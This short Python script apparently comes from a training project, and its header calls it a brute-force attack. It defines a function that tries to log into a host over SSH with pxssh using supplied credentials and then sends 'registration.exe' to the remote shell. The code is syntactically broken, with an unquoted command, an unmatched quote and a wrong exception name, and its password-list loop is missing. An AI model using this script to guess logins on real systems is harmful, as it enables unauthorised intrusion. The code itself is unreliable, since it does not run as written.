#!/usr/bin/env python3

# Script:                 NHS Project 
# Author:                 Kimberly Dills
# Date of last revision:  11/2/2020
# Description of purpose: Brute Force Attack

import time
from pexpect import pxssh
from shutil import copyfile
    
def cracker(user, ipAddress, badFile, secret ):

 
    
    try:
        s=pxssh.pxssh()
        s.login(ipAddress, user, secret)
        s.sendline(registration.exe)
    except pxssh.Exception.Pxssh as e:
        print (pxssh failed to login")
        print (e)
        time.sleep(1)
    
